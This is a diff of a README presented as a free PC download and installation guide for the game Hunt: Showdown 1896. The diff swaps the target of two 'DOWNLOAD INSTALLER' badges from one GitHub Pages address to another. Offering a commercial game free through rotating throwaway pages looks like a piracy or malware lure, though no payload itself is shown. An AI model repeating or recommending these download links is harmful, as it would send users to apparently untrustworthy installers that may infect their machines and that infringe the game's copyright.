@@ -1,6 +1,6 @@
 # 🧠 Hunt: Showdown 1896 — Free PC Download & Installation Guide
 
-[![🎯 DOWNLOAD INSTALLER — HUNT: SHOWDOWN 1896](https://img.shields.io/badge/🎯%20DOWNLOAD-INSTALLER%20%E2%80%94%20HUNT%3A%20SHOWDOWN%201896-darkgreen?style=for-the-badge&logo=sketch&logoColor=white)](https://ryadikmntiiks.github.io/.github/huntsas)
+[![🎯 DOWNLOAD INSTALLER — HUNT: SHOWDOWN 1896](https://img.shields.io/badge/🎯%20DOWNLOAD-INSTALLER%20%E2%80%94%20HUNT%3A%20SHOWDOWN%201896-darkgreen?style=for-the-badge&logo=sketch&logoColor=white)](https://hunt-showdown-1896-download-game.github.io/.github)
 
 ## ⚙️ About the Game
 
@@ -25,7 +25,7 @@ Download **Hunt: Showdown 1896 for free on PC** and immerse yourself in a haunti
 
 ---
 
-[![🎯 DOWNLOAD INSTALLER — HUNT: SHOWDOWN 1896](https://img.shields.io/badge/🎯%20DOWNLOAD-INSTALLER%20%E2%80%94%20HUNT%3A%20SHOWDOWN%201896-darkgreen?style=for-the-badge&logo=sketch&logoColor=white)](https://ryadikmntiiks.github.io/.github/huntsas)
+[![🎯 DOWNLOAD INSTALLER — HUNT: SHOWDOWN 1896](https://img.shields.io/badge/🎯%20DOWNLOAD-INSTALLER%20%E2%80%94%20HUNT%3A%20SHOWDOWN%201896-darkgreen?style=for-the-badge&logo=sketch&logoColor=white)](https://hunt-showdown-1896-download-game.github.io/.github)
 
 ---
 
